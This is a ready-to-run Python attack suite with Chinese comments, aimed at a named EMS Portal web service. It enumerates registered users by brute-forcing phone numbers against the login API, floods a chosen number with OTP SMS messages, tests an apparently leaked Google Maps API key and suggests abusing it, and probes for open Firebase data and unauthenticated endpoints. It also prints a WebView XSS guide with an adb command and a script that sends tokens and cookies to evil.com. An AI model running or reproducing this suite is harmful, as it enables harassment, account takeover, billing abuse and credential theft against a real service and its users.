#!/usr/bin/env python3
"""
EMS Portal - 无需注册攻击套件
综合利用所有不需要注册的漏洞
"""

import requests
import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class NoRegisterAttack:
    def __init__(self):
        self.base_url = "http://ws.ems.com.vn"
        self.findings = {}
    
    def banner(self):
        print(f"""
{Colors.RED}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║       EMS Portal - 无需注册攻击套件                        ║
║       完全不需要注册账号的漏洞利用                          ║
╚══════════════════════════════════════════════════════════════╝
{Colors.RESET}

{Colors.YELLOW}可用攻击:{Colors.RESET}
  1. 用户枚举 - 扫描所有注册用户
  2. SMS轰炸 - 验证码攻击
  3. 硬编码密钥滥用
  4. 信息泄露探测
  5. WebView XSS (需要ADB或社会工程)

{Colors.CYAN}优势:{Colors.RESET}
  • 完全不需要注册
  • 不需要Token
  • 远程攻击
  • 批量自动化

{Colors.RED}法律声明: 仅用于授权安全测试{Colors.RESET}
        """)
    
    def user_enumeration(self, start_prefix="0901", count=1000):
        """用户枚举 - 找出所有注册用户"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}[攻击1] 用户枚举{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        print(f"扫描号段: {start_prefix}XXXXXX")
        print(f"扫描数量: {count}\n")
        
        registered = []
        tested = 0
        
        def check_phone(phone):
            """检查手机号是否注册"""
            try:
                # 尝试登录
                r = requests.post(
                    f"{self.base_url}/api/v1/auth/login",
                    json={"phone": phone, "password": "test123"},
                    timeout=3
                )
                
                if r.status_code == 200:
                    data = r.json()
                    msg = data.get('message', '').lower()
                    
                    # 分析错误消息判断用户是否存在
                    if 'password' in msg or 'wrong' in msg or 'incorrect' in msg:
                        return phone  # 用户存在 (密码错误)
                    elif 'not found' in msg or 'not exist' in msg or 'does not exist' in msg:
                        return None  # 用户不存在
            except:
                pass
            
            return None
        
        # 生成电话号码列表
        phones = [f"{start_prefix}{i:06d}" for i in range(count)]
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            results = executor.map(check_phone, phones)
            
            for phone in results:
                tested += 1
                
                if phone:
                    registered.append(phone)
                    print(f"{Colors.GREEN}[+] 找到用户: {phone}{Colors.RESET}")
                
                if tested % 100 == 0:
                    print(f"{Colors.YELLOW}[*] 进度: {tested}/{count} | 已找到: {len(registered)}{Colors.RESET}", end='\r')
        
        print()  # 换行
        
        self.findings['registered_users'] = registered
        
        print(f"\n{Colors.GREEN}{Colors.BOLD}[结果] 枚举到 {len(registered)} 个注册用户{Colors.RESET}\n")
        
        if registered:
            # 保存结果
            with open('registered_users.txt', 'w') as f:
                f.write('\n'.join(registered))
            
            print(f"{Colors.GREEN}[+] 已保存到: registered_users.txt{Colors.RESET}")
            
            # 显示部分结果
            print(f"\n{Colors.YELLOW}部分用户列表:{Colors.RESET}")
            for user in registered[:20]:
                print(f"  • {user}")
            
            if len(registered) > 20:
                print(f"  ... 还有 {len(registered)-20} 个")
        
        return registered
    
    def sms_bombing(self, target_phone, count=10):
        """SMS轰炸攻击"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}[攻击2] SMS轰炸{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        print(f"{Colors.YELLOW}⚠️  警告: 此攻击会骚扰目标用户{Colors.RESET}")
        print(f"目标: {target_phone}")
        print(f"数量: {count}\n")
        
        success = 0
        failed = 0
        
        for i in range(count):
            try:
                r = requests.post(
                    f"{self.base_url}/api/v1/auth/send-otp",
                    json={"phone": target_phone},
                    timeout=5
                )
                
                if r.status_code == 200:
                    data = r.json()
                    
                    if data.get('code') == 'success':
                        success += 1
                        print(f"{Colors.GREEN}[{i+1}/{count}] 发送成功{Colors.RESET}", end='\r')
                    else:
                        failed += 1
                        print(f"{Colors.RED}[{i+1}/{count}] 失败: {data.get('message')}{Colors.RESET}")
                else:
                    failed += 1
            
            except Exception as e:
                failed += 1
            
            time.sleep(0.5)  # 避免过快
        
        print()  # 换行
        
        print(f"\n{Colors.GREEN}[结果] 成功: {success}, 失败: {failed}{Colors.RESET}")
    
    def test_hardcoded_keys(self):
        """测试硬编码密钥"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}[攻击3] 硬编码密钥利用{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        # 已发现的硬编码密钥
        keys = {
            'Google Maps API Key': {
                'key': 'AIzaSyDlXZ8_ObB-QSiV8E5q4TyO3HVPuIQ8d_E',
                'test_url': 'https://maps.googleapis.com/maps/api/geocode/json',
                'test_params': {'address': 'Hanoi Vietnam'}
            },
            'Firebase Database': {
                'url': 'https://ems-portal-vietnam.firebaseio.com/.json'
            }
        }
        
        for name, config in keys.items():
            print(f"{Colors.YELLOW}测试: {name}{Colors.RESET}")
            
            if 'key' in config:
                # Google API Key
                try:
                    params = config['test_params'].copy()
                    params['key'] = config['key']
                    
                    r = requests.get(config['test_url'], params=params, timeout=5)
                    
                    if r.status_code == 200:
                        print(f"  {Colors.GREEN}✓ 密钥有效!{Colors.RESET}")
                        print(f"  {Colors.RED}可以滥用:{Colors.RESET}")
                        print(f"    • 消耗API配额")
                        print(f"    • 用于自己项目")
                        print(f"    • 生成大量请求导致超额账单")
                        
                        # 显示示例
                        print(f"\n  {Colors.CYAN}使用示例:{Colors.RESET}")
                        print(f'    curl "{config["test_url"]}?address=test&key={config["key"]}"')
                    else:
                        print(f"  {Colors.YELLOW}状态: {r.status_code}{Colors.RESET}")
                
                except Exception as e:
                    print(f"  {Colors.RED}测试失败: {e}{Colors.RESET}")
            
            elif 'url' in config:
                # Firebase
                try:
                    r = requests.get(config['url'], timeout=5)
                    
                    if r.status_code == 200:
                        print(f"  {Colors.RED}✓ 可访问! (无规则保护){Colors.RESET}")
                        print(f"  数据: {r.text[:100]}...")
                    elif r.status_code == 401:
                        print(f"  {Colors.GREEN}✓ 需要认证 (有保护){Colors.RESET}")
                    else:
                        print(f"  状态: {r.status_code}")
                
                except Exception as e:
                    print(f"  {Colors.RED}测试失败: {e}{Colors.RESET}")
            
            print()
    
    def info_disclosure(self):
        """信息泄露探测"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}[攻击4] 信息泄露探测{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        endpoints = [
            "/api/v1/config/app-version",
            "/api/v1/config/list-status",
            "/api/v1/be/list-address",
            "/api/v1/config",
        ]
        
        print(f"测试无需认证的端点...\n")
        
        for endpoint in endpoints:
            print(f"{Colors.YELLOW}测试: {endpoint}{Colors.RESET}")
            
            try:
                r = requests.get(self.base_url + endpoint, timeout=5)
                
                print(f"  HTTP: {r.status_code}")
                
                if r.status_code == 200:
                    try:
                        data = r.json()
                        print(f"  {Colors.GREEN}✓ 可访问 (无需Token){Colors.RESET}")
                        print(f"  数据: {json.dumps(data, ensure_ascii=False)[:100]}...")
                    except:
                        print(f"  响应: {r.text[:100]}...")
                elif r.status_code == 404:
                    print(f"  {Colors.YELLOW}端点不存在{Colors.RESET}")
                else:
                    print(f"  需要认证或其他错误")
            
            except Exception as e:
                print(f"  {Colors.RED}请求失败: {e}{Colors.RESET}")
            
            print()
    
    def webview_exploit_guide(self):
        """WebView XSS利用指南"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}[攻击5] WebView XSS/RCE{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        print(f"{Colors.YELLOW}漏洞:{Colors.RESET}")
        print(f"  FollowDriverOnMapActivity 直接加载Intent中的URL")
        print(f"  无验证 + JavaScript启用 = XSS/RCE\n")
        
        print(f"{Colors.YELLOW}利用方法:{Colors.RESET}\n")
        
        print(f"1. 物理访问 (需要ADB):")
        print(f"   adb shell am start -n com.emsportal/.grab.activity.FollowDriverOnMapActivity \\")
        print(f'     -e KEY_URL_FOLLOW_DRIVER_ON_MAP "http://evil.com/xss.html"\n')
        
        print(f"2. 恶意链接 (社会工程):")
        print(f"   生成包含恶意Intent的链接/二维码")
        print(f"   诱导用户点击\n")
        
        print(f"3. 自动化工具:")
        print(f"   {Colors.GREEN}python3 webview_exploit.py{Colors.RESET}\n")
        
        print(f"{Colors.CYAN}Payload示例 (xss.html):{Colors.RESET}")
        print(f'''
<script>
  // 窃取LocalStorage
  var token = localStorage.getItem('PREF_TOKEN_USER');
  
  // 发送到攻击者服务器
  fetch('https://evil.com/collect', {{
    method: 'POST',
    body: JSON.stringify({{
      token: token,
      localStorage: localStorage,
      cookies: document.cookie
    }})
  }});
</script>
        ''')
    
    def run_all(self):
        """运行所有攻击"""
        self.banner()
        
        input(f"\n{Colors.YELLOW}按Enter开始攻击...{Colors.RESET}")
        
        # 1. 用户枚举
        print(f"\n{Colors.BOLD}开始攻击序列...{Colors.RESET}")
        users = self.user_enumeration(start_prefix="0901", count=200)
        
        # 2. 测试硬编码密钥
        self.test_hardcoded_keys()
        
        # 3. 信息泄露
        self.info_disclosure()
        
        # 4. WebView利用指南
        self.webview_exploit_guide()
        
        # 5. SMS轰炸 (可选)
        print(f"\n{Colors.YELLOW}[可选] SMS轰炸攻击{Colors.RESET}")
        if users:
            bomb = input(f"是否对某个用户进行SMS轰炸? (y/N): ")
            
            if bomb.lower() == 'y':
                target = input("目标手机号: ")
                count = int(input("发送次数 (默认10): ") or "10")
                self.sms_bombing(target, count)
        
        # 总结
        print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}攻击完成 - 总结{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\n")
        
        print(f"{Colors.GREEN}已执行的攻击:{Colors.RESET}")
        print(f"  • 用户枚举: 找到 {len(users)} 个用户")
        print(f"  • 硬编码密钥: 已测试")
        print(f"  • 信息泄露: 已探测")
        print(f"  • WebView XSS: 指南已生成\n")
        
        print(f"{Colors.CYAN}生成的文件:{Colors.RESET}")
        print(f"  • registered_users.txt - 注册用户列表\n")
        
        print(f"{Colors.YELLOW}后续利用:{Colors.RESET}")
        print(f"  1. 使用枚举到的用户进行凭证填充")
        print(f"  2. 社会工程 + WebView XSS")
        print(f"  3. 滥用硬编码密钥")

def main():
    attack = NoRegisterAttack()
    
    import argparse
    parser = argparse.ArgumentParser(
        description='EMS Portal无需注册攻击套件',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('--enum', action='store_true', help='只执行用户枚举')
    parser.add_argument('--keys', action='store_true', help='只测试硬编码密钥')
    parser.add_argument('--info', action='store_true', help='只探测信息泄露')
    parser.add_argument('--sms', metavar='PHONE', help='SMS轰炸指定号码')
    
    args = parser.parse_args()
    
    if args.enum:
        attack.banner()
        attack.user_enumeration()
    elif args.keys:
        attack.banner()
        attack.test_hardcoded_keys()
    elif args.info:
        attack.banner()
        attack.info_disclosure()
    elif args.sms:
        attack.banner()
        attack.sms_bombing(args.sms, 10)
    else:
        # 运行所有
        attack.run_all()

if __name__ == '__main__':
    main()
